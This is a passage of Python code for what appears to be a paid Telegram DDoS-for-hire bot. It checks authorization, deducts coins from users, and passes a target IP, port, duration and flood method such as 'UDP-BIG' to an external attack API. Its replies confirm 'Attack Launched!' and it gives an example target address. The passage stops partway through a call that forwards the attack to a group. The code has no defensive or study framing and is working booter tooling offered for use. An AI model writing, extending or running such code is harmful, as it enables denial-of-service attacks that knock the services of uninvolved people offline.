async def send_api_attack(target: str, port: int, duration: int, method: str = "UDP-BIG"):
    """Send attack request to API"""
    async with aiohttp.ClientSession() as session:
        params = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method
        }
        
        try:
            async with session.get(API_URL, params=params, timeout=aiohttp.ClientTimeout(total=30)) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return {"success": False, "error": f"HTTP {response.status}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    username = update.message.from_user.username or "Unknown"
    users = load_users()

    # Authorization check
    if user_id not in ADMIN_IDS and user_id not in users:
        await update.message.reply_text("❌ Unauthorized! Buy access from admin.")
        return

    if user_id not in ADMIN_IDS and users[user_id]["coins"] < ATTACK_COST:
        await update.message.reply_text("❌ Tere coins khatam ho gaye hain! Mahakal se buy kar.")
        return

    # Parse command
    command = update.message.text.split()
    if len(command) < 4:
        await update.message.reply_text("📌 Usage: /attack <target> <port> <time>\n💡 Example: /attack 34.0.15.133 19876 60")
        return
    
    target = command[1]
    port = command[2]
    attack_time = command[3]
    method = command[4] if len(command) > 4 else "UDP-BIG"

    if not port.isdigit() or not attack_time.isdigit():
        await update.message.reply_text("⚠️ Error: Port and Time must be numbers.")
        return

    port = int(port)
    attack_time = int(attack_time)

    if attack_time > MAX_ATTACK_DURATION:
        await update.message.reply_text(f"⏳ Max attack time is {MAX_ATTACK_DURATION} sec.")
        return

    # Check if user has enough coins
    if user_id not in ADMIN_IDS:
        total_cost = ATTACK_COST
        if users[user_id]["coins"] < total_cost:
            await update.message.reply_text("❌ Insufficient coins!")
            return
        users[user_id]["coins"] -= total_cost
        save_users(users)
        remaining_coins = users[user_id]["coins"]
    else:
        remaining_coins = "Unlimited"

    # Initial response
    await update.message.reply_text(
        f"🎯 **Attack Launched!**\n"
        f"Target: `{target}:{port}`\n"
        f"Time: `{attack_time}s`\n"
        f"Method: `{method}`\n"
        f"💰 Coins Deducted: `{ATTACK_COST}`\n"
        f"💰 Remaining Coins: `{remaining_coins}`\n\n"
        f"⏳ Processing your request..."
    )

    # Send to group
    await context.bot.send_message(
        GROUP_ID,
